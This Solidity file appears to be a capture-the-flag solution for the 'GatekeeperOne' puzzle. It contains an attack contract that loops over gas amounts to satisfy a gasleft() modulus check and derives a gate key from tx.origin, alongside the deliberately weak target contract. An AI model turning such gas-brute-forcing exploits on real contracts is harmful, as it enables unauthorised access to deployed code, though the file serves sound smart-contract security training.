// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import {Script, console2} from "forge-std/Script.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }
    function attack() external {
        for (uint256 i = 0; i < 8191; i++) {
            try target.enter{gas: i + 8191 * 10}(bytes8(0x100000000 + uint64(uint16(uint160(tx.origin))))) {
                console2.log("found: ", i);
                break;   // попали — gateTwo прошёл
            } catch {
                
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        //console2.log("gateOne: ", msg.sender != tx.origin);
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        //console2.log("gateTwo: gasLeft={}", gasleft() % 8191);
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}